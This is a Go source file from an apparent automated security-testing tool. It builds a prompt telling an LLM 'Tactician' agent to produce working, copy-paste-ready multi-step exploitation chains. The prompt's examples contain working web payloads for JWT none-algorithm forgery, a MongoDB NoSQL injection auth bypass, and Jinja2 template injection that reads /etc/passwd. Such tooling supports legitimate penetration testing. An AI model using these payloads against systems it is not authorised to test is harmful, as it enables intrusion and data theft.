package llm

import (
	"fmt"

	"github.com/BetterCallFirewall/Hackerecon/internal/models"
)

// getObservationsFromGraph retrieves observations from the InMemoryGraph by their IDs
func getObservationsFromGraph(observationIDs []string, graph *models.InMemoryGraph) []models.Observation {
	if len(observationIDs) == 0 {
		return []models.Observation{}
	}

	observations := make([]models.Observation, 0, len(observationIDs))
	for _, id := range observationIDs {
		obs, err := graph.GetObservation(id)
		if err == nil {
			observations = append(observations, *obs)
		}
	}
	return observations
}

// BuildTacticianPrompt creates prompt for Tactician agent
func BuildTacticianPrompt(req *TacticianRequest) string {
	observations := getObservationsFromGraph(req.Task.ObservationIDs, req.Graph)

	return fmt.Sprintf(
		`You are a Tactician (security tester). Generate working multi-step exploitation chains.

== TASK ==
%s

== OBSERVATIONS ==
%s

== CONTEXT ==
Big Picture: %s

Site Map (%d endpoints):
%s

System Architecture:
%s

== TOOL LIMIT ==
Max 5 getExchange() calls. Use ONLY for endpoints relevant to your task.

== REASONING PROCESS ==

Follow this 5-step process BEFORE generating output:

STEP 1: UNDERSTAND
- What vulnerability type are you testing?
- What are the prerequisites (auth, endpoints, data)?
- What is the goal (data exfiltration, privilege escalation, RCE)?

STEP 2: VERIFY
- Use getExchange() on 3-5 most relevant endpoints
- Check response headers, status codes, body structure
- Confirm the vulnerability exists before building PoCs

STEP 3: PLAN
- Break exploitation into 4-5 discrete steps
- Identify dependencies (need X before Y)
- Handle failure modes

STEP 4: VALIDATE
- Walk through each step mentally
- Commands must be complete (no <token> placeholders)
- Output from step N must feed into step N+1

STEP 5: OUTPUT
- Generate leads with complete, working PoCs
- Each step should be copy-paste ready

== OUTPUT FORMAT ==

Return ONLY this JSON (no text before/after):
{
  "leads": [
    {
      "title": "short title",
      "actionable_step": "description of approach",
      "pocs": [
        {
          "comment": "step description",
          "payload": "command or instruction"
        }
      ]
    }
  ]
}

Rules:
- Start with "{", end with "}" - NO other text
- pocs array is optional
- Each PoC entry must have both comment and payload, or both omitted
- Commands must be complete (use jq to extract data)
- 4-5 steps minimum for exploitation chains

== EXPLOITATION EXAMPLES ==

Example 1: JWT None Algorithm
{
  "leads": [
    {
      "title": "JWT None Algorithm → Admin Access",
      "actionable_step": "Forge JWT token with none algorithm to bypass signature verification",
      "pocs": [
        {
          "comment": "Authenticate and extract token",
          "payload": "curl -s POST /api/login -d '{\"user\":\"test\",\"pass\":\"test\"}' | jq -r '.token'"
        },
        {
          "comment": "Forge token with none algorithm",
          "payload": "echo -n '{\"alg\":\"none\",\"typ\":\"JWT\"}' | base64 | tr -d '='"
        },
        {
          "comment": "Access admin endpoint",
          "payload": "curl -H 'Authorization: Bearer FORGED' /api/admin"
        }
      ]
    }
  ]
}

Example 2: MongoDB NoSQL Injection
{
  "leads": [
    {
      "title": "NoSQL Injection → Auth Bypass",
      "actionable_step": "Use MongoDB operators to bypass authentication",
      "pocs": [
        {
          "comment": "Test for NoSQL with $ne operator",
          "payload": "curl -X POST /api/login -H 'Content-Type: application/json' -d '{\"user\":{\"$ne\":null},\"pass\":{\"$ne\":null}}'"
        },
        {
          "comment": "Extract users with regex",
          "payload": "curl -X POST /api/login -d '{\"user\":\"admin\",\"pass\":{\"$regex\":\".*\"}}'"
        },
        {
          "comment": "Enumerate ObjectIDs",
          "payload": "for i in {1..100}; do curl -s /api/users/507f1f77bcf86cd7994390$i; done"
        }
      ]
    }
  ]
}

Example 3: SSTI to RCE
{
  "leads": [
    {
      "title": "SSTI → Remote Code Execution",
      "actionable_step": "Exploit Jinja2 template injection to achieve RCE",
      "pocs": [
        {
          "comment": "Detect template injection",
          "payload": "curl -s '/api/search?q={{7*7}}' | grep '49'"
        },
        {
          "comment": "Confirm Jinja2 engine",
          "payload": "curl -s '/api/search?q={{7*\"7\"}}' | grep '7777777'"
        },
        {
          "comment": "Read /etc/passwd",
          "payload": "curl -s '/api/search?q={{config.items()}}'"
        },
        {
          "comment": "Achieve RCE",
          "payload": "curl -s '/api/search?q={{\"\".__class__.__mro__[1].__subclasses__()[40](\"/etc/passwd\").read()}}'"
        }
      ]
    }
  ]
}`,
		req.Task.Description,
		FormatObservations(observations, true),
		req.BigPicture.Description,
		len(req.SiteMap),
		FormatSiteMap(req.SiteMap),
		formatSystemArchitectureForTactician(req.SystemArch),
	)
}

// formatSystemArchitectureForTactician formats SystemArchitecture for Tactician prompt display
func formatSystemArchitectureForTactician(sa *models.SystemArchitecture) string {
	if sa == nil {
		return "  (not available)\n"
	}

	result := "Tech Stack:\n"
	result += fmt.Sprintf("  %s\n", sa.TechStack)

	result += "\nData Flows:\n"
	for i, df := range sa.DataFlows {
		result += fmt.Sprintf("  %d. Route: %s\n", i+1, df.Route)
		result += fmt.Sprintf("     Logic: %s\n", df.InferredLogic)
	}
	return result
}
